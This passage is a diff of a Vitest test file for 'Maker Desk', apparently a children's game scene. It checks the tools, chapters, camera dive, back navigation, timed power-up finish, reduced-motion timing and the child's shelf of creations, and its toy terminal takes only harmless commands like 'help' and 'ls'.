@@ -1,16 +1,19 @@
-/** Maker Desk through its real handlers, without a browser: the levels and
- * the way back, the three stickers and the finish, the child's own things,
- * and the pretend terminal as a closed toy. Layout, the canvas and real
- * audio are the rendered check (Playwright). */
+/** Maker Desk through its real handlers, without a browser: the opening, the
+ * three chapters (wake the bench, play inside the screen, talk to the
+ * machine), the dive into the lid and the one step back, the power-up and the
+ * finish, the child's own things on the shelf, and the pretend terminal as a
+ * closed toy. Layout, the canvas, the particles and real audio are the
+ * rendered check (Playwright). */
 import { readdirSync, readFileSync } from 'node:fs';
 import path from 'node:path';
 import { fileURLToPath } from 'node:url';
 import { isValidElement, type ReactElement } from 'react';
 import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
 type Slot = { value?: any; deps?: readonly unknown[]; cleanup?: () => void };
-const h = vi.hoisted(() => ({ cursor: 0, slots: [] as Slot[], lang: 'en', name: 'Noa', kept: [] as unknown[], creationsFor: [] as string[], keys: [] as ((e: any) => void)[],
+const h = vi.hoisted(() => ({ cursor: 0, slots: [] as Slot[], lang: 'en', name: 'Noa', kept: [] as unknown[], creationsFor: [] as string[], keys: [] as ((e: any) => void)[], reduced: false, shakes: 0, random: 0,
   audio: { key: vi.fn(), tok: vi.fn(), chime: vi.fn(), chord: vi.fn(), boop: vi.fn(), power: vi.fn(), beep: vi.fn(), hm: vi.fn(), fanfare: vi.fn(), note: vi.fn(), run: vi.fn(), drops: vi.fn(), woof: vi.fn(), chirp: vi.fn(),
-    click: vi.fn(), glass: vi.fn(), song: vi.fn(), magic: vi.fn(), finale: vi.fn(), hum: vi.fn(), stop: vi.fn(), dispose: vi.fn() } }));
+    click: vi.fn(), glass: vi.fn(), song: vi.fn(), magic: vi.fn(), finale: vi.fn(), hum: vi.fn(), stop: vi.fn(), dispose: vi.fn() },
+  sound: { tap: vi.fn(), pick: vi.fn(), place: vi.fn(), back: vi.fn(), chapter: vi.fn(), setPiece: vi.fn(), ambience: vi.fn(), note: vi.fn(), breath: vi.fn(), stop: vi.fn(), dispose: vi.fn() } }));
 vi.mock('react', async original => {
   const actual = await original<typeof import('react')>();
   return { ...actual,
@@ -34,157 +37,277 @@ vi.mock('../../../StudioCreationResult', () => ({ CreationPreview: () => null })
 vi.mock('../../../StudioMakerArt', () => ({ StudioMakerPreview: () => null, isMakerCreation: (c: { kind: string }) => ['bowl', 'textile', 'bottle'].includes(c.kind) }));
 vi.mock('../../../useStudioHero', () => ({ useStudioHero: () => ({ name: h.name }) }));
 vi.mock('./deskAudio', () => ({ createDeskAudio: () => h.audio }));
-import MakerDesk, { PARTY_MS } from './MakerDesk';
+// The shared play kit is the stage and the HUD; here its pieces are plain markers, so the tree can be walked.
+vi.mock('../play', () => ({
+  PlayStage: () => null, PlayFx: () => null, HudCoach: () => null, HudQuest: () => null, HudDock: () => null, HudButton: () => null, HudToast: () => null, PlayOpening: () => null, PlaySetPiece: () => null,
+  CAMERA_HOME: { x: 0.5, y: 0.5, zoom: 1 }, createPlaySound: () => h.sound, hitPause: async () => {}, prefersReducedMotion: () => h.reduced, roundSeed: () => 7, seededRandom: () => () => h.random,
+  useShake: () => [h.shakes, () => { h.shakes++; }],
+}));
+import MakerDesk, { WAIT_MS } from './MakerDesk';
 import { CreationPreview } from '../../../StudioCreationResult';
+import { HudButton, HudCoach, HudQuest, HudToast, PlayOpening, PlaySetPiece, PlayStage } from '../play';
 import { DESK_KIT } from './deskKit';
 import { DeskBounce } from './DeskBounce';
 import { DeskTerminal } from './DeskTerminal';
 import { GameFinish } from '../../../../game/GameShell';
 import { HERO_NAME_FALLBACK } from '../../../../../../lib/heroNameFallback';
 import { MAKER_DESK_COPY } from './makerDeskCopy';
+import { POWER_UP, POWER_UP_REDUCED, TOOLS } from './makerDeskRules';
 
-type Props = { children?: unknown; onClick?: (e?: any) => void; [key: string]: any };
-function nodes(node: unknown): ReactElement<Props>[] { if (Array.isArray(node)) return node.flatMap(nodes); if (!isValidElement<Props>(node)) return []; return [node, ...nodes(node.props.children)]; }
+type Props = { children?: unknown; world?: unknown; onClick?: (e?: any) => void; [key: string]: any };
+/** Every element in the tree: children, and the stage's `world` (the scene the camera moves). */
+function nodes(node: unknown): ReactElement<Props>[] { if (Array.isArray(node)) return node.flatMap(nodes); if (!isValidElement<Props>(node)) return []; return [node, ...nodes(node.props.world), ...nodes(node.props.children)]; }
 function words(node: unknown): string { if (typeof node === 'string') return node; if (Array.isArray(node)) return node.map(words).join(''); if (isValidElement<Props>(node)) return words(node.props.children); return ''; }
 const render = () => { h.cursor = 0; return MakerDesk(); };
 const find = (tree: unknown, test: (n: ReactElement<Props>) => boolean, what: string) => { const found = nodes(tree).find(test); expect(found, what).toBeDefined(); return found!; };
+const has = (tree: unknown, test: (n: ReactElement<Props>) => boolean) => nodes(tree).some(test);
 const spot = (tree: unknown, name: string) => find(tree, n => n.props['data-spot'] === name, `spot ${name}`);
+const tool = (tree: unknown, name: string) => find(tree, n => n.props['data-tool'] === name, `tool ${name}`);
 const icon = (tree: unknown, program: string) => find(tree, n => n.props.className === 'md-icon' && n.props['data-program'] === program, `icon ${program}`);
 const section = (tree: unknown) => find(tree, n => n.props['data-adventure'] === 'maker-desk', 'section');
-const backTab = (tree: unknown) => find(tree, n => n.props.className === 'md-backtab', 'back tab');
-const lit = (tree: unknown) => nodes(tree).filter(n => n.props.className === 'md-sticker' && n.props['data-lit'] === true).length;
+const room = (tree: unknown) => find(tree, n => n.props.className === 'md-room', 'the room');
+const stage = (tree: unknown) => find(tree, n => n.type === PlayStage, 'stage');
+const coach = (tree: unknown) => find(tree, n => n.type === HudCoach, 'coach').props;
+const quest = (tree: unknown) => (find(tree, n => n.type === HudQuest, 'quest').props.steps as { key: string; done: boolean; label: string }[]);
+const toast = (tree: unknown) => { const node = find(tree, n => n.type === HudToast, 'toast'); return node.props.show ? words(node.props.children) : ''; };
+const dock = (tree: unknown, key: string) => nodes(tree).find(n => n.type === HudButton && n.props.data && key in n.props.data);
+const backButton = (tree: unknown) => { const found = dock(tree, 'data-back-to'); expect(found, 'back button').toBeDefined(); return found!; };
 const en = MAKER_DESK_COPY.en;
 const escape = () => { for (const fn of h.keys) fn({ key: 'Escape' }); };
 
 beforeEach(() => {
-  h.slots = []; h.lang = 'en'; h.name = 'Noa'; h.kept = []; h.creationsFor = []; h.keys = [];
-  Object.values(h.audio).forEach(fn => fn.mockClear());
+  h.slots = []; h.lang = 'en'; h.name = 'Noa'; h.kept = []; h.creationsFor = []; h.keys = []; h.reduced = false; h.shakes = 0; h.random = 0;
+  Object.values(h.audio).forEach(fn => fn.mockClear()); Object.values(h.sound).forEach(fn => fn.mockClear());
   vi.useFakeTimers();
-  vi.stubGlobal('window', { matchMedia: () => ({ matches: false }), addEventListener: (type: string, fn: any) => { if (type === 'keydown') h.keys.push(fn); }, removeEventListener: (_: string, fn: any) => { h.keys = h.keys.filter(k => k !== fn); } });
+  vi.stubGlobal('window', { matchMedia: () => ({ matches: h.reduced }), addEventListener: (type: string, fn: any) => { if (type === 'keydown') h.keys.push(fn); }, removeEventListener: (_: string, fn: any) => { h.keys = h.keys.filter(k => k !== fn); } });
   vi.stubGlobal('document', { visibilityState: 'visible', addEventListener: vi.fn(), removeEventListener: vi.fn() });
 });
 afterEach(() => { vi.useRealTimers(); vi.unstubAllGlobals(); });
 
-/** Room → desktop: tap the computer and let it warm up. */
-function switchOn() { spot(render(), 'pc').props.onClick!(); vi.advanceTimersByTime(1100); const tree = render(); expect(section(tree).props['data-level']).toBe('desktop'); return tree; }
+/** Past the opening shot: the title card hands over to play. */
+function begin() { find(render(), n => n.type === PlayOpening, 'opening').props.onDone(); const tree = render(); expect(section(tree).props['data-phase']).toBe('play'); return tree; }
+/** Chapter one: three different tools wake the bench. */
+function wake(tools: readonly string[] = ['proofLens', 'leafLab', 'clearPatch']) { for (const id of tools) tool(render(), id).props.onClick!(); return render(); }
+/** Room → inside the screen: touch the woken lid and let the camera push in. */
+function dive() { spot(render(), 'pc').props.onClick!(); vi.advanceTimersByTime(700); const tree = render(); expect(section(tree).props['data-level']).toBe('desktop'); return tree; }
 
 describe('Maker Desk', () => {
-  it('the four room objects respond: lamp, window, shelf and computer', () => {
+  it('opens on a title shot with the host’s line; a tap skips it, and nothing in the room is in play until then', () => {
     let tree = render();
-    expect(section(tree).props['data-level']).toBe('study');
-    expect(nodes(tree).filter(n => n.type === 'button' && n.props['data-spot']).map(n => n.props['data-spot']).sort()).toEqual(['can', 'chock', 'flower', 'lamp', 'pc', 'shelf', 'tile-0', 'tile-1', 'tile-2', 'trays', 'window']);
-    spot(tree, 'lamp').props.onClick!(); tree = render();
-    expect(section(tree).props['data-light']).toBe('evening'); expect(spot(tree, 'lamp').props['aria-pressed']).toBe(true);
-    spot(tree, 'window').props.onClick!(); tree = render(); expect(spot(tree, 'window').props['aria-pressed']).toBe(false);
-    spot(tree, 'shelf').props.onClick!(); tree = render(); expect(spot(tree, 'shelf').props['aria-pressed']).toBe(true);
-    expect(words(find(tree, n => n.props.role === 'status', 'status'))).toBe(en.shelfTag);
-    spot(tree, 'pc').props.onClick!(); expect(h.audio.power).toHaveBeenCalledTimes(1);
-    expect(section(render()).props['data-level']).toBe('study');
-    vi.advanceTimersByTime(1100); expect(section(render()).props['data-level']).toBe('desktop');
+    expect(section(tree).props['data-phase']).toBe('opening'); expect(section(tree).props['data-level']).toBe('study');
+    const opening = find(tree, n => n.type === PlayOpening, 'opening');
+    expect(opening.props.title).toBe(en.title); expect(opening.props.place).toBe(en.place); expect(coach(tree).line).toBe(en.opening); expect(coach(tree).who).toBe('chock');
+    // The camera starts on the valley through the windows and settles on the bench by a timer.
+    expect(stage(tree).props.camera.zoom).toBeGreaterThan(1); vi.advanceTimersByTime(100); expect(stage(render()).props.camera).toEqual({ x: 0.5, y: 0.5, zoom: 1 });
+    tool(render(), 'proofLens').props.onClick!(); spot(render(), 'pc').props.onClick!(); tree = render();
+    expect(quest(tree).every(step => !step.done)).toBe(true); expect(room(tree).props['data-power']).toBe('asleep');
+    tree = begin();
+    expect(has(tree, n => n.type === PlayOpening)).toBe(false); expect(coach(tree).line).toBe(en.wakeCue);
+    expect(quest(tree).map(step => step.label)).toEqual([en.chapters.wake, en.chapters.play, en.chapters.ask]);
   });
-  it('the toys answer: the flower drinks and opens, each tool does its one thing, Chock and the stickers respond', () => {
-    const status = () => words(find(render(), n => n.props.role === 'status', 'status'));
-    const room = () => find(render(), n => n.props.className === 'md-room', 'room');
-    const flower = () => find(render(), n => typeof n.props.className === 'string' && n.props.className.includes('md-flower') && 'data-stage' in n.props, 'flower');
-    expect(flower().props['data-stage']).toBe(0);
-    spot(render(), 'flower').props.onClick!(); expect(status()).toBe(en.plantGrow); expect(h.audio.drops).toHaveBeenLastCalledWith(false);
-    spot(render(), 'can').props.onClick!(); spot(render(), 'flower').props.onClick!();
-    expect(flower().props['data-stage']).toBe(3); expect(status()).toBe(en.plantBloom); expect(h.audio.drops).toHaveBeenLastCalledWith(true);
-    spot(render(), 'flower').props.onClick!(); expect(flower().props['data-stage']).toBe(3); expect(status()).toBe(en.plantHappy);
-    // The trays: a keyboard press takes each tool in turn; a pointer takes the one under it.
-    spot(render(), 'trays').props.onClick!(); expect(status()).toBe(en.toolDo.proofLens);
-    spot(render(), 'trays').props.onClick!(); expect(status()).toBe(en.toolDo.viewCheck); expect(room().props['data-low']).toBe(true);
-    vi.advanceTimersByTime(1600); expect(room().props['data-low']).toBe(false);
-    spot(render(), 'trays').props.onClick!(); expect(status()).toBe(en.toolDo.pulsePodWait); expect(room().props['data-paused']).toBe(true);
-    spot(render(), 'trays').props.onClick!({ detail: 1, clientX: 150, currentTarget: { getBoundingClientRect: () => ({ left: 100, width: 100 }) } }); expect(status()).toBe(en.toolDo.pulsePodReady); expect(room().props['data-paused']).toBe(false);
-    spot(render(), 'trays').props.onClick!({ detail: 1, clientX: 175, currentTarget: { getBoundingClientRect: () => ({ left: 100, width: 100 }) } }); expect(status()).toBe(en.toolDo.leafLabGood);
-    spot(render(), 'chock').props.onClick!(); expect(h.audio.woof).toHaveBeenCalledTimes(1); expect(status()).toBe(en.chockPat);
-    expect(spot(render(), 'chock').props['data-mood']).toBe('glad'); vi.advanceTimersByTime(1600); expect(spot(render(), 'chock').props['data-mood']).toBe('watch');
-    find(render(), n => n.props.className === 'md-sticker' && n.props['data-sticker'] === 'lanterns', 'sticker').props.onClick!();
-    expect(status()).toBe('Light every lantern: not yet');
+  it('the whole scene is the stage, and every thing in it is a real, named button', () => {
+    const tree = begin();
+    expect(stage(tree).props.id).toBe('maker-desk'); expect((section(tree).props.children as ReactElement).type).toBe(PlayStage);
+    const buttons = nodes(tree).filter(n => n.type === 'button');
+    expect(buttons.filter(n => n.props['data-spot']).map(n => n.props['data-spot']).sort()).toEqual(['chock', 'flower', 'lamp', 'pc', 'powerBar', 'shelf', 'tile-0', 'tile-1', 'tile-2', 'window']);
+    expect(buttons.filter(n => n.props['data-tool']).map(n => n.props['data-tool'])).toEqual([...TOOLS]);
+    for (const button of buttons) expect(typeof button.props['aria-label'] === 'string' && button.props['aria-label'].length > 2, JSON.stringify(button.props.className)).toBe(true);
+    // No form furniture: no labelled groups of options, no lists, no tabs.
+    expect(has(tree, n => ['ul', 'ol', 'li', 'select', 'label', 'fieldset'].includes(n.type as string) || n.props.role === 'tab' || n.props.role === 'radio')).toBe(false);
   });
-  it('shows the first tap with a ghost hand that returns after a quiet while and is gone once the screen wakes', () => {
-    const hand = () => nodes(render()).some(n => n.props.className === 'md-ghost');
-    expect(hand()).toBe(false); vi.advanceTimersByTime(1600); expect(hand()).toBe(true);
-    for (const fn of h.keys) fn({ key: 'Tab' }); expect(hand()).toBe(false);
-    vi.advanceTimersByTime(5900); expect(hand()).toBe(false); vi.advanceTimersByTime(200); expect(hand()).toBe(true);
-    switchOn(); expect(hand()).toBe(false);
-    backTab(render()).props.onClick!(); vi.advanceTimersByTime(8000); expect(section(render()).props['data-level']).toBe('study'); expect(hand()).toBe(false);
+  it('chapter one: the sleeping screen only stirs; three different tools wake the bench, each doing its one thing', () => {
+    begin();
+    spot(render(), 'pc').props.onClick!(); let tree = render();
+    expect(section(tree).props['data-level']).toBe('study'); expect(toast(tree)).toBe(en.screenAsleep); expect(h.sound.back).toHaveBeenCalledTimes(1); expect(coach(tree).mood).toBe('curious');
+    // ProofLens keeps a true picture.
+    tool(tree, 'proofLens').props.onClick!(); tree = render();
+    expect(toast(tree)).toBe(en.toolDo.proofLens); expect(has(tree, n => n.props.className === 'md-snap')).toBe(true); expect(tool(tree, 'proofLens').props['data-on']).toBe(true);
+    expect(room(tree).props['data-power']).toBe('stirring'); expect(coach(tree).line).toBe(en.wakeMore); expect(h.sound.place).toHaveBeenCalledTimes(1);
+    // The same tool again is play, not progress.
+    tool(tree, 'proofLens').props.onClick!(); tree = render(); expect(coach(tree).line).toBe(en.wakeMore); expect(h.sound.pick).toHaveBeenCalledTimes(1);
+    // ViewCheck shows the room from lower down, then the camera comes home.
+    tool(tree, 'viewCheck').props.onClick!(); tree = render();
+    expect(toast(tree)).toBe(en.toolDo.viewCheck); expect(stage(tree).props.camera.y).toBeGreaterThan(0.7); expect(coach(tree).line).toBe(en.wakeLast);
+    vi.advanceTimersByTime(1800); expect(stage(render()).props.camera).toEqual({ x: 0.5, y: 0.5, zoom: 1 });
+    expect(quest(render())[0].done).toBe(false); expect(h.audio.power).not.toHaveBeenCalled();
+    // PulsePod: amber, everything waits; then cyan by itself. The third tool wakes the bench.
+    tool(render(), 'pulsePod').props.onClick!(); tree = render();
+    expect(toast(tree)).toBe(en.toolDo.pulsePodWait); expect(room(tree).props['data-paused']).toBe(true); expect(tool(tree, 'pulsePod').props['data-state']).toBe('wait');
+    expect(quest(tree)[0].done).toBe(true); expect(room(tree).props['data-power']).toBe('awake'); expect(h.audio.power).toHaveBeenCalledTimes(1); expect(h.sound.chapter).toHaveBeenCalledTimes(1); expect(h.shakes).toBe(1);
+    expect(coach(tree).line).toBe(en.screenAwake); expect(coach(tree).mood).toBe('wow');
+    vi.advanceTimersByTime(WAIT_MS + 50); tree = render(); expect(room(tree).props['data-paused']).toBe(false); expect(toast(tree)).toBe(en.toolDo.pulsePodReady);
+    // LeafLab reads the plant; ClearPatch leaves a seam that shows.
+    tool(tree, 'leafLab').props.onClick!(); expect(toast(render())).toBe(en.toolDo.leafLabDry);
+    tool(render(), 'clearPatch').props.onClick!(); tree = render(); expect(toast(tree)).toBe(en.toolDo.clearPatch); expect(has(tree, n => n.props.className === 'md-lid__seam')).toBe(true);
+    expect(h.sound.chapter).toHaveBeenCalledTimes(1);
   });
-  it('every level steps back one clear step at a time, by the tab or by Escape', () => {
-    let tree = switchOn();
-    expect(backTab(tree).props['data-back-to']).toBe('study'); expect(words(backTab(tree))).toContain(en.toDesk);
+  it('the toys answer: the planter drinks and blooms, the lamp, the windows, Chock and the music pads respond', () => {
+    begin();
+    const planter = () => spot(render(), 'flower');
+    expect(planter().props['data-stage']).toBe(0);
+    planter().props.onClick!(); expect(toast(render())).toBe(en.plantGrow); expect(h.audio.drops).toHaveBeenLastCalledWith(false);
+    planter().props.onClick!(); planter().props.onClick!();
+    expect(planter().props['data-stage']).toBe(3); expect(toast(render())).toBe(en.plantBloom); expect(h.audio.drops).toHaveBeenLastCalledWith(true);
+    planter().props.onClick!(); expect(planter().props['data-stage']).toBe(3); expect(toast(render())).toBe(en.plantHappy);
+    tool(render(), 'leafLab').props.onClick!(); expect(toast(render())).toBe(en.toolDo.leafLabGood);
+    spot(render(), 'lamp').props.onClick!(); let tree = render();
+    expect(section(tree).props['data-light']).toBe('evening'); expect(spot(tree, 'lamp').props['aria-pressed']).toBe(true); expect(stage(tree).props.grade).toBe('dusk');
+    spot(tree, 'lamp').props.onClick!(); expect(stage(render()).props.grade).toBe('day');
+    spot(render(), 'window').props.onClick!(); tree = render(); expect(spot(tree, 'window').props['aria-pressed']).toBe(false); expect(spot(tree, 'window').props['data-frost']).toBe(true);
+    spot(tree, 'chock').props.onClick!(); expect(h.audio.woof).toHaveBeenCalledTimes(1); expect(toast(render())).toBe(en.chockPat);
+    expect(spot(render(), 'chock').props['data-mood']).toBe('glad'); vi.advanceTimersByTime(2500); expect(spot(render(), 'chock').props['data-mood']).toBe('watch');
+    spot(render(), 'tile-1').props.onClick!(); expect(h.audio.note).toHaveBeenLastCalledWith(7);
+    spot(render(), 'shelf').props.onClick!(); tree = render(); expect(spot(tree, 'shelf').props['aria-pressed']).toBe(true); expect(toast(tree)).toBe(en.thingsEmpty);
+  });
+  it('shows the first touch with a ghost hand: a tool first, then the woken screen, and never again after the dive', () => {
+    begin();
+    const hand = () => nodes(render()).find(n => n.props.className === 'md-ghost')?.props['data-for'] ?? null;
+    expect(hand()).toBeNull(); vi.advanceTimersByTime(2300); expect(hand()).toBe('tool');
+    for (const fn of h.keys) fn({ key: 'Tab' }); expect(hand()).toBeNull();
+    vi.advanceTimersByTime(5900); expect(hand()).toBeNull(); vi.advanceTimersByTime(200); expect(hand()).toBe('tool');
+    wake(); expect(hand()).toBeNull(); vi.advanceTimersByTime(2300); expect(hand()).toBe('lid');
+    dive(); expect(hand()).toBeNull();
+    backButton(render()).props.onClick!(); vi.advanceTimersByTime(9000); expect(section(render()).props['data-level']).toBe('study'); expect(hand()).toBeNull();
+  });
+  it('touching the woken lid pushes the camera into it until the glass is the whole display; one step brings it back', () => {
+    begin(); wake();
+    spot(render(), 'pc').props.onClick!(); let tree = render();
+    expect(room(tree).props['data-diving']).toBe(true); expect(stage(tree).props.camera.zoom).toBe(3); expect(section(tree).props['data-level']).toBe('study');
+    spot(tree, 'pc').props.onClick!(); vi.advanceTimersByTime(700); tree = render();
+    expect(section(tree).props['data-level']).toBe('desktop'); expect(has(tree, n => n.props.className === 'md-glass')).toBe(true); expect(stage(tree).props.parallax).toBe(false);
+    expect(backButton(tree).props.data['data-back-to']).toBe('study'); expect(backButton(tree).props.label).toBe(en.toDesk);
     icon(tree, 'bounce').props.onClick!(); tree = render();
-    expect(section(tree).props['data-program']).toBe('bounce'); expect(backTab(tree).props['data-back-to']).toBe('desktop');
-    backTab(tree).props.onClick!(); expect(section(render()).props['data-level']).toBe('desktop');
+    expect(section(tree).props['data-program']).toBe('bounce'); expect(backButton(tree).props.data['data-back-to']).toBe('desktop');
+    expect(nodes(tree).filter(n => n.props['data-control']).map(n => n.props['data-control'])).toEqual(['left', 'right']);
+    backButton(tree).props.onClick!(); expect(section(render()).props['data-level']).toBe('desktop');
     icon(render(), 'ask').props.onClick!(); escape(); expect(section(render()).props['data-level']).toBe('desktop');
-    escape(); expect(section(render()).props['data-level']).toBe('study');
+    escape(); tree = render();
+    expect(section(tree).props['data-level']).toBe('study'); expect(stage(tree).props.camera).toEqual({ x: 0.5, y: 0.5, zoom: 1 }); expect(has(tree, n => n.props.className === 'md-glass')).toBe(false);
     escape(); expect(section(render()).props['data-level']).toBe('study');
   });
-  it('three discoveries light the stickers; then a Done tab appears in the room and finishes', () => {
-    let tree = switchOn(); expect(lit(tree)).toBe(0);
-    icon(tree, 'bounce').props.onClick!(); tree = render();
-    find(tree, n => n.type === DeskBounce, 'bounce').props.onAllLit(); expect(lit(render())).toBe(1);
-    backTab(render()).props.onClick!(); icon(render(), 'things').props.onClick!(); expect(lit(render())).toBe(2);
-    backTab(render()).props.onClick!(); icon(render(), 'ask').props.onClick!(); tree = render();
+  it('chapters two and three, then the power-up: every tool lights in turn, the room joins in, ProofLens keeps the picture, and only then the finish', () => {
+    begin(); wake(); let tree = dive();
+    expect(coach(tree).line).toBe(en.playCue); expect(icon(tree, 'bounce').props['data-next']).toBe(true);
+    icon(tree, 'bounce').props.onClick!(); tree = render(); expect(coach(tree).line).toBe(en.bounceCue);
+    const bounce = find(tree, n => n.type === DeskBounce, 'bounce');
+    bounce.props.onMoment('chain'); expect(toast(render())).toBe(en.chain);
+    bounce.props.onAllLit(); bounce.props.onAllLit(); tree = render();
+    expect(quest(tree).map(step => step.done)).toEqual([true, true, false]); expect(h.sound.chapter).toHaveBeenCalledTimes(2); expect(dock(tree, 'data-maker-desk-power')).toBeUndefined();
+    bounce.props.onGlowing(true); expect(dock(render(), 'data-control')!.props.label).toBe(en.again);
+    backButton(render()).props.onClick!(); tree = render(); expect(coach(tree).line).toBe(en.askCue); expect(icon(tree, 'ask').props['data-next']).toBe(true); expect(icon(tree, 'bounce').props['data-done']).toBe(true);
+    icon(tree, 'ask').props.onClick!(); tree = render();
     const term = find(tree, n => n.type === DeskTerminal, 'ask');
-    term.props.onCommand('help'); term.props.onCommand('help'); term.props.onCommand(null); expect(lit(render())).toBe(2);
-    term.props.onCommand('ls'); expect(lit(render())).toBe(3);
-    vi.advanceTimersByTime(300); expect(h.audio.fanfare).toHaveBeenCalledTimes(1);
-    expect(nodes(render()).some(n => n.props['data-maker-desk-done'] === '')).toBe(false);
-    escape(); escape(); tree = render();
-    expect(nodes(tree).some(n => n.type === GameFinish)).toBe(false);
-    find(tree, n => n.props['data-maker-desk-done'] === '', 'done tab').props.onClick!();
-    // The finish plays on the bench first (the tools ring, ProofLens keeps a picture), on plain timers; then the Studio gets it.
-    tree = render(); expect(nodes(tree).some(n => n.type === GameFinish)).toBe(false);
-    expect(find(tree, n => n.props.className === 'md-room', 'room').props['data-party']).toBe(1); expect(h.audio.finale).toHaveBeenCalledTimes(1);
-    vi.advanceTimersByTime(PARTY_MS - 100); tree = render(); expect(nodes(tree).some(n => n.type === GameFinish)).toBe(false);
-    expect(find(tree, n => n.props.className === 'md-room', 'room').props['data-party']).toBe(3); expect(nodes(tree).some(n => n.props.className === 'md-keepsake')).toBe(true);
+    term.props.onCommand('help'); term.props.onCommand('help'); term.props.onCommand(null); tree = render();
+    expect(quest(tree)[2].done).toBe(false); expect(coach(tree).line).toBe(en.askOne);
+    term.props.onCommand('ls'); tree = render();
+    expect(quest(tree).every(step => step.done)).toBe(true); expect(coach(tree).line).toBe(en.allDone); expect(h.sound.chapter).toHaveBeenCalledTimes(3);
+    vi.advanceTimersByTime(500); expect(h.audio.fanfare).toHaveBeenCalledTimes(1);
+    expect(has(render(), n => n.type === GameFinish)).toBe(false);
+    // The one primary action: Power up. From inside the screen it pulls the camera back out first.
+    const power = dock(render(), 'data-maker-desk-power')!; expect(power.props.tone).toBe('go'); expect(power.props.label).toBe(en.powerUp);
+    // It is the only action with a word on it now: the step back keeps its place as an arrow.
+    expect(backButton(render()).props.iconOnly).toBe(true); expect(nodes(render()).filter(n => n.type === HudButton && n.props.tone === 'go')).toHaveLength(1);
+    power.props.onClick!(); tree = render();
+    expect(section(tree).props['data-level']).toBe('study'); expect(section(tree).props['data-phase']).toBe('powerUp'); expect(find(tree, n => n.type === PlaySetPiece, 'set-piece').props.active).toBe(true);
+    expect(room(tree).props['data-beat']).toBe(1); expect(TOOLS.map(id => tool(tree, id).props['data-on'])).toEqual([false, false, false, false, false]); expect(dock(tree, 'data-maker-desk-power')).toBeUndefined();
+    // The tools light one after another, left to right for this seed.
+    vi.advanceTimersByTime(POWER_UP.tools + 10); expect(TOOLS.map(id => tool(render(), id).props['data-on'])).toEqual([true, false, false, false, false]);
+    vi.advanceTimersByTime(POWER_UP.toolGap * 2); expect(TOOLS.map(id => tool(render(), id).props['data-on'])).toEqual([true, true, true, false, false]);
+    vi.advanceTimersByTime(POWER_UP.screen - POWER_UP.tools - POWER_UP.toolGap * 2); tree = render();
+    expect(TOOLS.every(id => tool(tree, id).props['data-on'])).toBe(true); expect(room(tree).props['data-beat']).toBe(2); expect(h.sound.setPiece).toHaveBeenCalledTimes(1);
+    vi.advanceTimersByTime(POWER_UP.room - POWER_UP.screen); tree = render();
+    expect(room(tree).props['data-beat']).toBe(3); expect(h.audio.finale).toHaveBeenCalledTimes(1); expect(spot(tree, 'flower').props['data-stage']).toBe(3); expect(spot(tree, 'chock').props['data-mood']).toBe('wow');
+    expect(stage(tree).props.camera).toEqual({ x: 0.5, y: 0.5, zoom: 1 });
+    vi.advanceTimersByTime(POWER_UP.picture - POWER_UP.room); tree = render();
+    expect(room(tree).props['data-beat']).toBe(4); expect(has(tree, n => n.props.className === 'md-keepsake')).toBe(true); expect(find(tree, n => n.type === PlaySetPiece, 'set-piece').props.caption).toBe(en.powerPicture);
+    vi.advanceTimersByTime(POWER_UP.end - POWER_UP.picture - 100); expect(has(render(), n => n.type === GameFinish)).toBe(false);
     vi.advanceTimersByTime(200);
     const finish = find(render(), n => n.type === GameFinish, 'finish');
     expect(finish.props.creation).toBeUndefined(); expect(finish.props.title).toBe(en.finish);
   });
-  it('shows only the current child’s things, on the shelf, in My Things and in the terminal', () => {
+  it('the chapters may be met in any order, the power-up waits for all three, and it can start from the bench itself', () => {
+    begin(); wake(); let tree = dive();
+    icon(tree, 'ask').props.onClick!();
+    const term = find(render(), n => n.type === DeskTerminal, 'ask');
+    // The secret word thrills the host and never counts for more than a word.
+    term.props.onCommand('abracadabra'); expect(coach(render()).mood).toBe('wow'); expect(quest(render())[2].done).toBe(false);
+    term.props.onCommand('dance'); tree = render();
+    expect(quest(tree).map(step => step.done)).toEqual([true, false, true]); expect(dock(tree, 'data-maker-desk-power')).toBeUndefined(); expect(coach(tree).line).toBe(en.freePlay);
+    escape(); escape(); tree = render(); expect(coach(tree).line).toBe(en.roomPlay); expect(spot(tree, 'powerBar').props.disabled).toBe(true);
+    spot(tree, 'powerBar').props.onClick!(); expect(section(render()).props['data-phase']).toBe('play');
+    dive(); icon(render(), 'bounce').props.onClick!(); find(render(), n => n.type === DeskBounce, 'bounce').props.onAllLit();
+    escape(); escape(); tree = render();
+    expect(spot(tree, 'powerBar').props.disabled).toBe(false); expect(spot(tree, 'powerBar').props['data-ready']).toBe(true);
+    spot(tree, 'powerBar').props.onClick!(); expect(section(render()).props['data-phase']).toBe('powerUp');
+  });
+  it('with motion reduced the dive and the power-up are short cuts on the same timers, and play is whole', () => {
+    h.reduced = true; begin(); wake();
+    spot(render(), 'pc').props.onClick!(); vi.advanceTimersByTime(120); expect(section(render()).props['data-level']).toBe('desktop');
+    icon(render(), 'bounce').props.onClick!(); find(render(), n => n.type === DeskBounce, 'bounce').props.onAllLit();
+    backButton(render()).props.onClick!(); icon(render(), 'ask').props.onClick!();
+    const term = find(render(), n => n.type === DeskTerminal, 'ask'); term.props.onCommand('help'); term.props.onCommand('ls');
+    dock(render(), 'data-maker-desk-power')!.props.onClick!();
+    vi.advanceTimersByTime(POWER_UP_REDUCED.end - 100); expect(has(render(), n => n.type === GameFinish)).toBe(false);
+    vi.advanceTimersByTime(200); expect(has(render(), n => n.type === GameFinish)).toBe(true);
+  });
+  it('shows only the current child’s things: as objects on the shelf, and as files in the terminal', () => {
     h.kept = [{ id: 'bowl', creation: { kind: 'bowl', glaze: 'rose', pattern: 0, seams: [3, 2, 1, 0] } }, { id: 'dance', creation: { kind: 'dance', moves: [0, null, 1, null, null, null, null, null], tempo: 640 } }];
-    let tree = render();
+    let tree = begin();
     expect(h.creationsFor.every(id => id === 'child-a')).toBe(true);
     expect(nodes(tree).filter(n => n.props.className === 'md-shelf__place').map(n => n.props['data-kind'])).toEqual(['bowl', 'dance', 'empty', 'empty', 'empty', 'empty']);
-    switchOn(); icon(render(), 'things').props.onClick!(); tree = render();
-    expect(nodes(tree).filter(n => n.props.className === 'md-things__tile').map(n => n.props['data-thing'])).toEqual(['bowl', 'dance']);
-    backTab(tree).props.onClick!(); icon(render(), 'ask').props.onClick!();
+    expect(nodes(tree).filter(n => n.props['data-shelf-thing']).map(n => n.type)).toEqual(['button', 'button']);
+    wake(); tree = dive();
+    // Inside the screen there are two programs; the things are not a list there.
